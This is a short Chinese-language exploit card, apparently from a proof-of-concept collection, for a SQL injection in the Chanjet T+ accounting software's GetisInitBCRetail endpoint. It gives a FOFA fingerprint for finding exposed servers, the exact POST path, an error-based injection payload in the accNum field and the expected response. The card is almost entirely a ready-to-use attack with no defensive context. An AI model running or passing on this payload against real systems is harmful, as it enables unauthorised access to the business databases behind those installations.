# 畅捷通TGetisInitBCRetail存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail HTTP/1.1`

**Payload**
```
{"accNum":"1' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))-- NCab"}
```
- **响应特征**：200